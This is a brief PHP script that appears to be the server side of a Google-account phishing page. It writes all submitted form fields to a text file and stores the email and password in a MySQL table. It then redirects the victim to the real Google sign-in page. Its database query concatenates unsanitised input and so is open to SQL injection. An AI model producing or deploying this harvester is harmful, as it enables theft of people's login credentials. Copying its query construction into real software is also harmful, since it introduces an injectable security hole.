<?php
header ('Location:https://accounts.google.com/');
$servername = "localhost";
$username = "aviv";
$password = "a";
$dbname = "Accounts";

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_POST["Email"];
			$sql = "INSERT INTO info (User, Password) VALUES ('".$email."', '".$pass."')";

                        if ($conn->query($sql) === TRUE) {
                            echo "Posted";
                        } else {
                           echo "Error: there is problem with your connection!";
                        }
$conn->close(); 

exit;
?>
